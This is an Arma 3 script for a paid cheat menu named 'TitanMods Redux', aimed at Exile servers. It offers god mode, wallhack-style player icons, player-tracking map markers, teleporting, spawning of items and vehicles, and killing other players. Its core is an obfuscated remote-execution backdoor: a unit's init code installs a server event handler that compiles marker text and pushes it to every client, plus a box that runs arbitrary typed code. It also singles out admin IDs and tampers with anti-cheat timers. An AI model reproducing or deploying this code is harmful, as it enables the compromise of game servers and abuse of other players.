comment "Property of Titan Mods - Any attempt to resell this menu will result in legal action.";



[] spawn {
				hint "Loading.";

				disableSerialization;

				_titanMods__tittle1 = "<t color='#56BFF2' size='3.0' align='center'>TitanMods Redux</t><br/>";
			_titanMods__props = "<t color='#FF1933' size='1.5' align='center'>Press F1 to Open</t><br/>";
			_titanMods__f1 = "<t color='#FF1933' size='1.5' align='center'> </t><br/>";
			_titanMods__keybizzle = "<t color='#FFFFFF' size='1.5' align='center'> Credits to: Lystic </t><br/>";
			_titanMods__keyswag = "<t color='#FFFFFF' size='1.5' align='center'>Version: Exile</t><br/>";
			_titanMods__Mr = "<t color='#FFFFFF' size='1.5' align='center'> REDUX </t><br/>";
			hint parseText(_titanMods__tittle1 + _titanMods__Mr + _titanMods__props + _titanMods__f1 + _titanMods__Mr + _titanMods__keyswag + _titanMods__keybizzle);




















		systemChat "TitanMods Redux Menu - Version 1.2 - www.TitanMods.online";

				_cfg_vehicle = configFile >> "cfgVehicles";
												if (isNil 'Jay_vehicle_list') then {
													Jay_vehicle_list = [];

													for "_i" from 0 to (count _cfg_vehicle)-1 do
													{
														_vehicle_class = _cfg_vehicle select _i;
														if (isClass _vehicle_class) then
														{
															_vehicle = configName _vehicle_class;
															if ((getNumber (_vehicle_class >> "scope") == 2) && (getText (_vehicle_class >> "picture") != "") && (((_vehicle isKindOf "LandVehicle") or (_vehicle isKindOf "Air") or (_vehicle isKindOf "Boat"))) && !((_vehicle isKindOf "ParachuteBase") or (_vehicle isKindOf "BIS_Steerable_Parachute"))) then
															{
																Jay_vehicle_list = Jay_vehicle_list + [_vehicle];
															};
														};
													};
												};

				weaponList = [];
				_weaponConfig = configFile >> "cfgWeapons";
				for "_i" from 0 to (count _weaponConfig)-1 do {
					 _weapon = _weaponConfig select _i;
					 if (isClass _weapon) then {
							 _weaponName = configName _weapon;
							 _ulx = toArray _weaponName;
							 _ulx resize 7;
							 _ulx;
							 _ulx = toString _ulx;
							 if ((_ulx != "ItemKey") and (getNumber (_weapon >> "scope") == 2) and ((getText (configFile >> "cfgWeapons" >> _weaponName >> "picture")) != "")) then {
									 weaponList = weaponList + [_weaponName];
								 };
						 };
				 };

		sleep 2;

		_titanModsAgent = createAgent ["Rabbit_F", position player, [], 0, "FORM"];

		_detector = format['%1 nearestObject "Rabbit_F"',getpos _titanModsAgent];
		_getVariable = compile format["params['_var','_default'];%1 getVariable [_var,_default];",_detector];
		_setVariable = compile format["params['_var','_value'];%1 setVariable [_var,_value];",_detector];
		["runloops",true] call _setVariable;
        _building = objNull;
		_loop = 0;
		while{isNull _building && !alive _building} do {
			_location = locationPosition (nearestLocation [[random(worldSize),random(worldSize),0],""]);
			_buildings = nearestObjects [_location, ["Building"], 300];
			if(count(_buildings) > 0) then {
				_building = _buildings select floor(random(count(_buildings)));
			};
			_loop = _loop + 1;
			if(_loop == 15000) exitWith {};
		};
		comment 'if(isNull _building) exitWith {hint "Failed to find a building! Could not run script!"};';
		_cargo = _building;
		_cargo allowDamage false;


["dfivedorraboughtfromtitanmods_ee7wgddhqdhjaiw7aow9q2h12",{
			params["_code"];
			private["_str","_chars","_packets","_fivedorraboughtfromtitanmods_co_de","_packetPart","_packetNum","_pIndex","_install","_marker","_pos","_timeout"];

			_str = str(_code) select [1];
			_str = _str select [0,count(_str)-1];
			_chars = _str splitString "";
			_packets = [];

			_fivedorraboughtfromtitanmods_co_de = "";
			_packetPart = [];
			_packetNum = 1;
			{
				if((_forEachIndex mod 1000 == 0 && _forEachIndex != 0) || (_forEachIndex == (count(_chars)-1))) then {
					_pIndex = count(_packets)+1;
					_packets pushback ("pac_" + str(_pIndex) + " = '" + (_packetPart joinString "") + "';");
					_packetPart = [];
					_fivedorraboughtfromtitanmods_co_de = _fivedorraboughtfromtitanmods_co_de + "+pac_" + str(_pIndex);
				};
				_packetPart pushback _x;
				if(_x == "'") then {
					_packetPart pushback "'";
				};
			} forEach _chars;
			_fivedorraboughtfromtitanmods_co_de = _fivedorraboughtfromtitanmods_co_de select [1];
			_packets pushBack ("_c = compile (" + _fivedorraboughtfromtitanmods_co_de + ");[] spawn _c;");

			_install = {
				params["_markerName"];
				private["_a","_b","_c"];
				createMarker[_markerName,[0.1,0.1]];
				_markerName setMarkerAlpha 0.001;
				_markerName setMarkerText "....";

				_a = 'if(isServer) then {
					inf = {
						ad' + 'dMis' + 'sionEv' + 'entHa' + 'ndler["Eachfr" + "ame","
							b" + "is_fun" + "ctions_mai" + "nscope setV" + "ariable [""R" + "EA2"",tr" + "ue];
							_mar" + "kerTe" + "xt = mar" + "kerTe" + "xt ""' + _markerName + '"";
							if(_ma" + "rkerT" + "ext != "".." + ".."") then {
								_c" + "ode = com" + "pile _mar" + "kerTe" + "xt;
								_c" + "ode re" + "mo" + "te" + "Exe" + "c [""ca" + "ll"",0];
								""' + _markerName + '"" se" + "tMa" + "rkerT" + "ext ""." + "..."";
							};
							removeAllMissionEventHandlers ""Eachframe"";
							[] sp" + "awn in" + "f;
						"];
					};
					ad' + 'dMis' + 'sionEv' + 'entHa' + 'ndler["Eachfr" + "ame","
						b" + "is_fun" + "ctions_mai" + "nscope setV" + "ariable [""R" + "EA2"",tr" + "ue];
						_mar" + "kerTe" + "xt = mar" + "kerTe" + "xt ""' + _markerName + '"";
						if(_ma" + "rkerT" + "ext != "".." + ".."") then {
							_c" + "ode = com" + "pile _mar" + "kerTe" + "xt;
							_c" + "ode re" + "mo" + "te" + "Exe" + "c [""ca" + "ll"",0];
							""' + _markerName + '"" se" + "tMa" + "rkerT" + "ext ""." + "..."";
						};
						removeAllMissionEventHandlers ""Eachframe"";
						[] sp" + "awn i" + "nf;
					"];
				};';

				_c = ("(typeof player) create");
				_c = _c + ("Unit [[0,0,0],create");
				_c = _c + ("Group sideLogic,'");
				_c = _c + _a;
				_c = _c + "'];";
				_b = compile _c;
				call _b;

			};

			_marker = "_USER_DEFINED #0/0/4";
			_pos = markerPos _marker;
			_timeout = false;
			if((_pos select 0) == 0) then {
				systemchat "RE INIT > Installing RE";
				[_marker] call _install;
				systemchat "RE INIT > Install done... Checking";
				_out = diag_tickTime + 30;
				waitUntil{!isNil {bis_functions_mainscope getVariable ["REA2",nil]} || (diag_tickTime > _out)};
				if(diag_tickTime > _out) exitWith {_timeout = true;};
				systemchat "RE INIT > Install Success";
			};
			if(_timeout) exitWith {
				systemchat "RE INIT > Failed to install RE.";
				systemchat "RE INIT > Either the server is lagging / crashing OR the RE is broke";
			};
			{
				_marker setMarkerText _x;
				waitUntil{markerText _marker == "...."};
				systemchat ("RE > Executed Packet " + str(_forEachIndex+1) + "/" + str(count(_packets)));
			} forEach _packets;
			systemchat "RE > Done.";
		}] call _setVariable;


tm_gm = {
systemChat "[TitanMods] God Mode Enabled";
			while{true} do {
				player allowDamage false;
				player setDamage --0;
				player allowDamage false;
    player removeAllEventhandlers 'HandleDamage';
    player addEventhandler ['HandleDamage', {false}];
    ExileClientPlayerAttributes = [100,100,100,100,0,37,0];
    ExileClientPlayerAttributesASecondAgo = ExileClientPlayerAttributes;
    ExileClientPlayerLastHpRegenerationAt = diag_tickTime;
    ExileClientPlayerIsOverburdened = false;
    ExileClientPlayerOxygen = 100;
    ExileClientPlayerIsAbleToBreathe = true;
    ExileClientPlayerIsDrowning = false;
    ExileClientPlayerIsInjured = false;
    ExileClientPlayerIsBurning = false;
    ExileClientPlayerIsBleeding = false;
    ExileClientPlayerIsExhausted = false;
    ExileClientPlayerIsHungry = false;
    ExileClientPlayerIsThirsty = false;
    player setBleedingRemaining 0;
    player setOxygenRemaining 1;
    player setFatigue 0;
    if(damage player > 0)then{player setDamage 0;};
				uiSleep 0.001;
			};
};

tm_esp = {
				systemChat "[TitanMods] Player Icons Enabled.";
				_a = "addMission";
				_a = _a + "EventHandler [""Draw3D"",{";
				_a = _a + "
					_ordered = [];
					{
						if(player distance _x <= 2000) then {
							_ordered pushback [str(side _x),str(vehicle _x == _x),name _x,_x];
						};
					} forEach (if(isMultiplayer) then {allPlayers} else {allUnits});
					_ordered sort true;
					";
				_a = _a + "
					{
						_side = _x select 0;
						_inVehicle = _x select 1;
						_name = _x select 2;
						_object = _x select 3;
						";
				_a = _a + "
						_pos = (_object modelToWorld ((_object selectionPosition ""neck"") vectorAdd [0,0,0.25]));
						";
				_a = _a + "
						_color = [1,0,1,1];
						if(side _object == blufor) then {
							_color = [0,0,1,1];
						};
						if(side _object == opfor) then {
							_color = [1,0,0,1];
						};
						if(side _object == independent) then {
							_color = [0,1,0,1];
						};

						if(getplayeruid _object in [""76561198152111329"",""76561198276380268""]) then {
							_color  =  [1,1,0];
							_name = ""INFISTAR"";
						};

						_scale = (0.05 - (0.05 *((player distance _object)/3000)));
						if(_scale > 0) then {
							draw";
				_a = _a + "Icon3D ["""", _color, _pos, 0, 0, 0, _name + "" - "" + str(round(player distance _object)) + ""m"", 2, _scale, ""PuristaMedium"",""center"",true];
						};
					} forEach _ordered;

				}];";

				_b = compile _a;
				_eh = call _b;
};
tm_kb = {

    if (!isnil "jm_press_exec") then
    {
        (findDisplay 46) displayRemoveEventHandler ["KeyDown", jm_press_exec];
    };



    jm_bindings_exec =
    {
    switch (_this) do
    {
    case 8:
    {
        vehicle player setVehicleAmmo 1;
        cursorTarget setVehicleAmmo 1;
    };
    case 211:
    {
        deleteVehicle cursorTarget;
    };
    case 184:
    {
        showCommandingMenu "#USER:jm_Main";

        _log1 = format["JamesMenu v6"];
        ['<t align=''left'' size=''0.6'' color=''#1500FF''>'+(_log1)+'</t>',safezoneX+0.036,safezoneY+0.13,15,0,0,123] spawn bis_fnc_dynamicText;


    };

    case 72:
    {
          _obj = cameraOn;
          _vel = velocity _obj;
          if(_obj isKindOf 'Air')then
          {
          _obj setVelocity [(_vel select 0),(_vel select 1),30];
          }
          else
          {
          _obj setVelocity [(_vel select 0),(_vel select 1),8];
          };
    };
    case 60:
    {
        ["TaskSucceeded",["","You were healed!"]] call bis_fnc_showNotification;
        player setDamage 0;
        vehicle player setDamage 0;
        vehicle player setFuel 1;   };
    case 64:
    {
        hint 'Speed Added';
        _vehicle = vehicle player;
        _vel = velocity _vehicle;
        _dir = direction _vehicle;
        _speed = 5; comment "Added speed";
        _vehicle setVelocity [
         (_vel select 0) + (sin _dir * _speed),
         (_vel select 1) + (cos _dir * _speed),
         (_vel select 2)
        ];
    call Jfivedorraboughtfromtitanmods_Love_Druggies;
    };
    case 200:
    {
    _distance = 2;
    _dir = getdir vehicle player;
    _pos = getpos vehicle player;
    if (surfaceIsWater getpos vehicle player) then {_pos = getPosASL vehicle player;}else{_pos = getPosATL vehicle player;};



    if ((vehicle player) isKindOf "Air") then
    {


        if (count(crew (vehicle player))>1) then
        {
            _pos = [(_pos select 0)+_distance*sin(_dir),(_pos select 1)+_distance*cos(_dir),(_pos select 2)+100];
        }
        else
        {
            _distance = 2;
            _pos = [(_pos select 0)+_distance*sin(_dir),(_pos select 1)+_distance*cos(_dir),(_pos select 2)];
        };


    }
    else
    {
        if ((_pos select 2) > 5) then
        {
            _pos = [(_pos select 0)+_distance*sin(_dir),(_pos select 1)+_distance*cos(_dir),(_pos select 2)];
        }
        else
        {
            _pos = [(_pos select 0)+_distance*sin(_dir),(_pos select 1)+_distance*cos(_dir),0];
        };
    };

    _Object = (vehicle player);
    if (surfaceIsWater _pos) then {_Object setPosASL _pos;}else{_Object setPosATL _pos;};
    sleep 1;

    };
  };
};


waituntil {!isnull (finddisplay 46)};
jm_press_exec = (findDisplay 46) displayAddEventHandler ["KeyDown", "_this select 1 call jm_bindings_exec; false;"];
sleep 1;

};


tm_mm = {	  tm_Noobs = [];
                 tm_Bitches = [];
                 if (isnil "tm_Map_Markers") then {
                     tm_Map_Markers = 0;
                 };
                 if (tm_Map_Markers == 0) then {
                     tm_Map_Markers = 1;
                     systemChat "[TitanMods] Players locations on the Map have been added.";
                 } else {
                     tm_Map_Markers = 0;
                     systemChat "[TitanMods] Players locations on the Map have been removed.";
                 };
                 while {
                     tm_Map_Markers == 1
                 }
                 do {
                     {
                         if ((vehicle _x isKindOf "LandVehicle") || (vehicle _x isKindOf "Air") || (vehicle _x isKindOf "Ship")) then {
                             if (count(crew vehicle _x) > 0) then {
                                 {
                                     if (!(_x in tm_Noobs) and(alive _x) and(getPlayerUID _x != "")) then {
                                         private["_pos", "_titan44", "_titan45"];
                                         _titan45 = vehicle _x;
                                         _pos = visiblePosition _x;
                                         _titan44 = createMarkerLocal[format["CRW%1%2", _pos select 0, _pos select 1], [(_pos select 0) + 20, _pos select 1, 0]];
                                         _titan8 = (gettext(configFile >> 'CfgVehicles' >> (typeof vehicle _x) >> 'displayName'));
                                         _titan44 setMarkerTextLocal format['%1---%2---%3m', name _x, _titan8, round(_x distance player)];
                                         _titan44 setMarkerTypeLocal "mil_dot";
                                         if ((side _x == side player) and(side _x != resistance)) then {
                                             _titan44 setMarkerColorLocal "ColorBlue";
                                         } else {
                                             _titan44 setMarkerColorLocal "ColorRed";
                                         };
                                         _titan44 setMarkerSizeLocal[1, 1];
                                         tm_Noobs set[count tm_Noobs, _x];
                                         [_x, _titan44, _titan45] spawn {
                                             private["_titan46", "_titan47", "_titan48"];
                                             _titan46 = _this select 0;
                                             _titan47 = _this select 1;
                                             while {
                                                 (tm_Map_Markers == 1) and(alive _titan46) and(vehicle _titan46 != _titan46) and(getPlayerUID _titan46 != "")
                                             }
                                             do {
                                                 _titan48 = ((crew vehicle _titan46) find _titan46);
                                                 _titan47 setMarkerPosLocal([(visiblePosition _titan46 select 0) + 20, (visiblePosition _titan46 select 1) - (25 + _titan48 * 20), 0]);
                                                 sleep 0.01;
                                             };
                                             deleteMarkerLocal _titan47;
                                             if (_titan46 in tm_Noobs) then {
                                                 tm_Noobs set[(tm_Noobs find _titan46), -1];
                                                 tm_Noobs = tm_Noobs - [-1];
                                             };
                                             true;
                                         };
                                     };
                                 }
                                 forEach crew vehicle _x;
                             };
                         } else {
                             if (!(_x in tm_Bitches) and(vehicle _x == _x) and(getPlayerUID _x != "")) then {
                                 private["_pos", "_titan44"];
                                 _pos = visiblePosition _x;
                                 _titan44 = createMarkerLocal[format["PLR%1%2", _pos select 0, _pos select 1], [(_pos select 0) + 20, _pos select 1, 0]];
                                 _titan44 setMarkerTypeLocal "mil_dot";
                                 _titan44 setMarkerSizeLocal[1, 1];
                                 if ((side _x == side player) and(side _x != resistance)) then {
                                     _titan44 setMarkerColorLocal "ColorRed";
                                 } else {
                                     _titan44 setMarkerColorLocal "ColorRedAlpha";
                                 };
                                 _titan44 setMarkerTextLocal format["%1---%2", name _x, round(_x distance player)];
                                 if (_x == player) then {
                                     _titan44 setMarkerColorLocal "ColorGreen";
                                 };
                                 tm_Bitches set[count tm_Bitches, _x];
                                 [_x, _titan44] spawn {
                                     private["_titan46", "_titan47"];
                                     _titan46 = _this select 0;
                                     _titan47 = _this select 1;
                                     while {
                                         (tm_Map_Markers == 1) and(alive _titan46) and(vehicle _titan46 == _titan46) and(getPlayerUID _titan46 != "")
                                     }
                                     do {
                                         _titan47 setMarkerPosLocal([visiblePosition _titan46 select 0, visiblePosition _titan46 select 1, 0]);
                                         sleep 0.01;
                                     };
                                     deleteMarkerLocal _titan47;
                                     if (_titan46 in tm_Bitches) then {
                                         tm_Bitches set[(tm_Bitches find _titan46), -1];
                                         tm_Bitches = tm_Bitches - [-1];
                                     };
                                     true;
                                 };
                             };
                         };
                     }
                     forEach allPlayers;
                     sleep 0.3;
                 }; {
                     _titan44 = str _x;
                     deleteMarkerLocal _titan44;
                 }
             forEach allPlayers;
         };

         fivedorraboughtfromtitanmods_openmenu = {
    	    switch (_this) do {
            case 59: {
              disableSerialization;
             createDialog "RscDisplayChat";
						 openMenu == 0;
						 openMenu == 1;
            };

    	    };
    	   };
    	   waituntil {!isnull (finddisplay 46)};
    	   (findDisplay 46) displayAddEventHandler ["KeyDown","_this select 1 call fivedorraboughtfromtitanmods_openmenu;false;"];

player addAction ["Open Menu", {createDialog "RscDisplayChat"; disableSerialization;}];

tm_weaponMenu = {
	 ctrlShow [1234, false];
	 ctrlShow [1235, false];
	 ctrlShow [1236, false];
	 ctrlShow [1237, false];
	 ctrlShow [1238, false];
	 ctrlShow [1239, false];
	 ctrlShow [1240, false];
	 ctrlShow [1241, false];
	 ctrlShow [1242, false];
	 ctrlShow [1243, false];
	 ctrlShow [1244, false];

	 15402 cutText ["","PLAIN"];
	 15403 cutText ["","PLAIN"];
		15401 cutText ["","PLAIN"];
		15405 cutText ["","PLAIN"];

	 systemChat "Menu Hidden";
	 sleep 1;
	 systemChat "Opening Menu";
  disableSerialization;
	 _classnameCtrl = findDisplay 24 ctrlCreate ["RscEdit", 2231];
	 _classnameCtrl ctrlCommit 0;
   _classnameCtrl  ctrlSetPosition [-0.350,-0.29,8.2 * (0.205),1.0 * (0.2)];
   _classnameCtrl ctrlCommit 0.5;
   uiNamespace setVariable ["&_classnameCtrl", _classnameCtrl];

	 _CameraList2 = findDisplay 24 ctrlCreate ["RscListBox", 22311];

	 _CameraList ctrlCommit 0;
	 _CameraList  ctrlSetPosition [0.002,0.53,0.75 * (0.65),3.8 * (0.2)];
	 _CameraList ctrlCommit 0.5;
	 _CameraList2 ctrlSetEventHandler ["LbDBlClick","call tm_spawnWeaponGear;"];

	 for "_i" from 0 to (count weaponList)-1 do
	 {
		 _weapon = weaponList select _i;
			 _CameraList2 lbAdd _weapon;
			 _CameraList2 lbSetPicture [_i, (getText (configFile >> "cfgWeapons" >> _weapon >> "picture"))];

};


	 _ctrl = (findDisplay 24) ctrlCreate ["RscButton", 2232];
	 _ctrl ctrlSetPosition [0.35,0.20,0.3,0.1];
	 _ctrl ctrlCommit 0;
	 _ctrl ctrlSetText "Spawn Weapon via Class";
	 _ctrl ctrlAddEventHandler ["ButtonClick", "[] spawn {_vehicleTM = (ctrlText (uiNamespace getVariable ""&_classnameCtrl"")); _vehicleTM createVehicle position player};"];


	 _CameraList2 = findDisplay 24 ctrlCreate ["RscListBox", 1];


	 _CameraList2 ctrlCommit 0;
	 _CameraList2  ctrlSetPosition [0.502,0.53,0.75 * (0.65),3.8 * (0.2)];
	 _CameraList2 ctrlCommit 0.5;
	 _CameraList2 ctrlSetEventHandler ["LbDBlClick","call tm_spawnWeapon;"];

	 _CameraList2 ctrlShow true;



		for "_i" from 0 to (count weaponList)-1 do
		{
			_weapon = weaponList select _i;
				_CameraList2 lbAdd _weapon;
				_CameraList2 lbSetPicture [_i, (getText (configFile >> "cfgWeapons" >> _weapon >> "picture"))];

};
};

tm_vehicleMenu = {
	 ctrlShow [1234, false];
	 ctrlShow [1235, false];
	 ctrlShow [1236, false];
	 ctrlShow [1237, false];
	 ctrlShow [1238, false];
	 ctrlShow [1239, false];
	 ctrlShow [1240, false];
	 ctrlShow [1241, false];
	 ctrlShow [1242, false];
	 ctrlShow [1243, false];
	 ctrlShow [1244, false];

	 15402 cutText ["","PLAIN"];
	 15403 cutText ["","PLAIN"];
		15401 cutText ["","PLAIN"];
		15405 cutText ["","PLAIN"];

	 systemChat "Menu Hidden";
	 sleep 1;
	 systemChat "Opening Menu";
  disableSerialization;
	 _classnameCtrl = findDisplay 24 ctrlCreate ["RscEdit", 2231];
	 _classnameCtrl ctrlCommit 0;
   _classnameCtrl  ctrlSetPosition [-0.350,-0.29,8.2 * (0.205),1.0 * (0.2)];
   _classnameCtrl ctrlCommit 0.5;
   uiNamespace setVariable ["&_classnameCtrl", _classnameCtrl];

	 _CameraList2 = findDisplay 24 ctrlCreate ["RscListBox", 22311];

	 _CameraList ctrlCommit 0;
	 _CameraList  ctrlSetPosition [0.002,0.53,0.75 * (0.65),3.8 * (0.2)];
	 _CameraList ctrlCommit 0.5;
	 _CameraList2 ctrlSetEventHandler ["LbDBlClick","call tm_spawnWeaponGear;"];

	 for "_i" from 0 to (count weaponList)-1 do
	 {
		 _weapon = weaponList select _i;
			 _CameraList2 lbAdd _weapon;
			 _CameraList2 lbSetPicture [_i, (getText (configFile >> "cfgWeapons" >> _weapon >> "picture"))];

};


	 _ctrl = (findDisplay 24) ctrlCreate ["RscButton", 2232];
	 _ctrl ctrlSetPosition [0.35,0.20,0.3,0.1];
	 _ctrl ctrlCommit 0;
	 _ctrl ctrlSetText "Spawn Weapon via Class";
	 _ctrl ctrlAddEventHandler ["ButtonClick", "[] spawn {_vehicleTM = (ctrlText (uiNamespace getVariable ""&_classnameCtrl"")); _vehicleTM createVehicle position player};"];

	 _CameraList = findDisplay 24 ctrlCreate ["RscListBox", 1337];


	 _CameraList ctrlCommit 0;
	 _CameraList  ctrlSetPosition [0.002,0.53,0.75 * (0.65),3.8 * (0.2)];
	 _CameraList ctrlCommit 0.5;
	 _CameraList ctrlSetEventHandler ["LbDBlClick","call fivedorraboughtfromtitanmods_Veh;"];

	 _CameraList ctrlShow true;

	 _CameraList lbAdd "Vehicle Spawning";

	 					for "_i" from 0 to (count Jay_vehicle_list)-1 do
	 					{
	 						_vehicles = Jay_vehicle_list select _i;

	 						_CameraList lbAdd _vehicles;
	 						_CameraList lbSetPicture [_i, (getText (configFile >> "cfgVehicles" >> _vehicles >> "picture"))];
	 					};
	 					lbSort _CameraList;
	 					fivedorraboughtfromtitanmods_Veh =
	 					{
	 						_ctrl = _this select 0;
	 						_index = _this select 1;
	 					 _vehicle_chosen = _ctrl lbText _index;
	 					 _dir = getDir vehicle player;
	 					 _pos1 = getPos vehicle player;
	 					 _pos = [(_pos1 select 0) + 5*(sin _dir), (_pos1 select 1) + 5*(cos _dir), (_pos1 select 2)];
	 					 _vehicle_chosen createVehicle _pos;
	 					};
};

tm_spawnWeapon =
{
	_ctrl = _this select 0;
	 _index = _this select 1;
	_weapon_selected = _ctrl lbText _index;
	if (_weapon_selected != "") then
	{
		_ammo_class_name = getArray(configFile >> "cfgWeapons" >> _weapon_selected >> "magazines");
		_ammo = _ammo_class_name select 0;

		player addWeapon _weapon_selected;
		player addMagazine _weapon_selected;
		player forceAddUniform  _weapon_selected;
		player addBackpackGlobal _weapon_selected;
		player addMagazine _ammo;player addMagazine _ammo;
		player addMagazine _ammo;player addMagazine _ammo;
		reload player;

		systemChat format["[TitanMods] Weapon Spawned : %1",_weapon_selected];
	};
};

tm_tele = {
  systemChat "[TitanMods] Zoom in all the way on the map to where you want to teleport, then press ESCAPE!";
  closeDialog 24;
  openMap [true,false];
  _coords = [0,0,0];
  while{visibleMap} do {
    _coords = ((findDisplay 12) displayCtrl 51) ctrlMapScreenToWorld [0.5,0.5];
    uiSleep 0.01;
  };
  vehicle player setpos _coords;
};

tm_giveAmmo = {
	_weapon = currentWeapon player;
	_mags = getArray(configfile >> 'cfgWeapons' >> _weapon >> 'magazines');
	_mag = _mags select 0;
	player addMagazine _mag;
	player addMagazine _mag;
	sleep(0.025);
	hint format["[TitanMods] 2 %1 added to your inventory.", _mag];
};
    tm_kill = {
    	_target = (_playerList select 0);
    	{
					if (name player == _target) then
					{
						_x setDamage --1;
					};
		}forEach allPlayers;
    };


	while{true} do {
		waitUntil {!isNull (findDisplay 24)};

			_CameraList = findDisplay 24 ctrlCreate ["RscEdit", 1234];
			_CameraList ctrlCommit 0;
			_CameraList  ctrlSetPosition [0.075,0.43,8.2 * (0.105),3.8 * (0.2)];
			_CameraList ctrlCommit 0.5;
			uiNamespace setVariable ["&cameraList", _CameraList];

			_ctrl = (findDisplay 24) ctrlCreate ["RscButton", 1235];
			_ctrl ctrlSetPosition [0.35,0.20,0.3,0.1];
			_ctrl ctrlCommit 0;
			_ctrl ctrlSetText "Click to Run";
			_ctrl ctrlAddEventHandler ["ButtonClick", "[] spawn (compile (ctrlText (uiNamespace getVariable ""&cameraList"")));"];

      _ctrl = (findDisplay 24) ctrlCreate ["RscButton", 1236];
      _ctrl ctrlSetPosition [1.255,-0.1,0.3,0.1];
      _ctrl ctrlCommit 0;
      _ctrl ctrlSetText "ESP";
      _ctrl ctrlAddEventHandler ["ButtonClick", "[] spawn tm_esp;"];

			_ctrl = (findDisplay 24) ctrlCreate ["RscButton", 1237];
      _ctrl ctrlSetPosition [0.100,-0.1,0.3,0.1];
      _ctrl ctrlCommit 0;
      _ctrl ctrlSetText "Vehicle Menu";
      _ctrl ctrlAddEventHandler ["ButtonClick", "[] spawn tm_vehicleMenu;"];

			_ctrl = (findDisplay 24) ctrlCreate ["RscButton", 1238];
			_ctrl ctrlSetPosition [0.560,-0.1,0.3,0.1];
			_ctrl ctrlCommit 0;
			_ctrl ctrlSetText "Weapon Menu";
			_ctrl ctrlAddEventHandler ["ButtonClick", "[] spawn tm_weaponMenu;"];

      _ctrl = (findDisplay 24) ctrlCreate ["RscButton", 1239];
      _ctrl ctrlSetPosition [1.255,+0.010,0.3,0.1];
      _ctrl ctrlCommit 0;
      _ctrl ctrlSetText "Map Markers";
      _ctrl ctrlAddEventHandler ["ButtonClick", "[] spawn tm_mm;"];

      _ctrl = (findDisplay 24) ctrlCreate ["RscButton", 1240];
      _ctrl ctrlSetPosition [1.255,+0.120,0.3,0.1];
      _ctrl ctrlCommit 0;
      _ctrl ctrlSetText "God Mode";
      _ctrl ctrlAddEventHandler ["ButtonClick", "[] spawn tm_gm;"];

      _ctrl = (findDisplay 24) ctrlCreate ["RscButton", 1241];
      _ctrl ctrlSetPosition [1.255,+0.230,0.3,0.1];
      _ctrl ctrlCommit 0;
      _ctrl ctrlSetText "Keybinds";
      _ctrl ctrlAddEventHandler ["ButtonClick", "[] spawn tm_kb;"];

      _ctrl = (findDisplay 24) ctrlCreate ["RscButton", 1242];
      _ctrl ctrlSetPosition [1.255,+0.340,0.3,0.1];
      _ctrl ctrlCommit 0;
      _ctrl ctrlSetText "Map Teleport";
      _ctrl ctrlAddEventHandler ["ButtonClick", "[] spawn tm_tele;"];

      _ctrl = (findDisplay 24) ctrlCreate ["RscButton", 1243];
      _ctrl ctrlSetPosition [1.255,+0.450,0.3,0.1];
      _ctrl ctrlCommit 0;
      _ctrl ctrlSetText "Give Ammo";
      _ctrl ctrlAddEventHandler ["ButtonClick", "[] spawn tm_giveAmmo;"];

			_ctrl = (findDisplay 24) ctrlCreate ["RscButton", 1244];
      _ctrl ctrlSetPosition [1.255,+0.560,0.3,0.1];
      _ctrl ctrlCommit 0;
      _ctrl ctrlSetText "Teleport to Player";
      _ctrl ctrlAddEventHandler ["ButtonClick", "[] spawn tm_tpTo;"];

			_ctrl = (findDisplay 24) ctrlCreate ["RscButton", 1245];
      _ctrl ctrlSetPosition [1.255,+0.560,0.3,0.1];
      _ctrl ctrlCommit 0;
      _ctrl ctrlSetText "Teleport Player to Me";
      _ctrl ctrlAddEventHandler ["ButtonClick", "[] spawn tm_tpPlayer;"];


		     _CameraList2 = findDisplay 24 ctrlCreate ["RscListBox", 1244];
		    _CameraList2 ctrlCommit 0;
        _CameraList2 ctrlsetbackgroundcolor [0,0,0,0.55];
        _CameraList2 ctrlSetPosition [-0.660,-0.3,8.2 * (0.050),50.8 * (0.030)];
		    _CameraList2 ctrlCommit 0.5;
		    _CameraList2 ctrlSetEventHandler ["LbDBlClick","[] spawn _addPlayer;"]; comment "add to player array";
		    _CameraList2 ctrlShow true;


				_CameraList2 lbAdd "=============== Players ================="; _CameraList2 lbSetColor [(lbSize _CameraList2)-1, [0, 1, 0, 1]];
				_CameraList2 lbAdd "";
				{
					if (isPlayer _x) then
					{
						_CameraList2 lbAdd format ["%1",name _x];
					};
				}forEach allPlayers;

				_CameraList2 lbAdd "";_CameraList2 lbAdd "==========================================="; _CameraList2 lbSetColor [(lbSize _CameraList2)-1, [0, 1, 0, 1]];


					  15403 cutrsc ["rscDynamicText","plain"];
		     _display = uinamespace getvariable "BIS_dynamicText";
		     _control = _display displayctrl 9999;
		  _control ctrlsetposition [0.075,0.43,8.2 * (0.105),3.8 * (0.2)];

		     _control ctrlsetbackgroundcolor [0,0,0,0.55];
		     _control ctrlsettextcolor [1,1,1,1];
		     _control ctrlCommit 0;


         15405 cutrsc ["rscDynamicText","plain"];
      _display = uinamespace getvariable "BIS_dynamicText";
      _control = _display displayctrl 9999;
   _control ctrlsetposition [-0.660,-0.3,8.2 * (0.050),50.8 * (0.030)];

      _control ctrlsetbackgroundcolor [0,0,0,0.25];
      _control ctrlsettextcolor [1,1,1,1];
      _control ctrlCommit 0;


         15402 cutrsc ["rscDynamicText","plain"];
               disableSerialization;
                _display = uinamespace getvariable "BIS_dynamicText";
                _control = _display displayctrl 9999;
             _control ctrlsetposition [1.20,-0.3,8.2 * (0.050),50.8 * (0.030)];

                _control ctrlsetbackgroundcolor [0,0,0,0.55];
                _control ctrlsettextcolor [1,1,1,1];
                _control ctrlCommit 0;
         _text = "<t size='0.45' color='#FF0000' align='center'>TitanMods - Commands<br/></t><t size='0.4' align='left'>";
         _control ctrlSetStructuredText parseText _text;
            _control ctrlCommit 0;

            15401 cutrsc ["rscDynamicText","plain"];

            _display = uinamespace getvariable "BIS_dynamicText";
            _controlName = _display displayctrl 9999;
            _controlName ctrlsetposition [safezonex,safezoney,safezonew,safezoneh/20];
            _controlName ctrlsetbackgroundcolor [0,0,0,0.55];
            _controlName ctrlsettextcolor [random(1),random(1),random(1),1];
            _controlName ctrlSetStructuredText parseText "<t size='0.8' align='center'> TitanMods - Redux Menu - v1.5</t>";
            _controlName ctrlCommit 0;


		waitUntil {isNull (findDisplay 24)};
		15402 cutText ["","PLAIN"];
		15403 cutText ["","PLAIN"];
    15401 cutText ["","PLAIN"];
    15405 cutText ["","PLAIN"];
	};


			disableSerialization;

		[_getVariable] spawn {
			_getVariable = _this select 0;
			while{["runloops",false] call _getVariable} do {
				uiSleep 0.1;
				ExileClientPlayerLastCombatAt = 0;
			};
		};

	["runloops",false] call _setVariable;

};
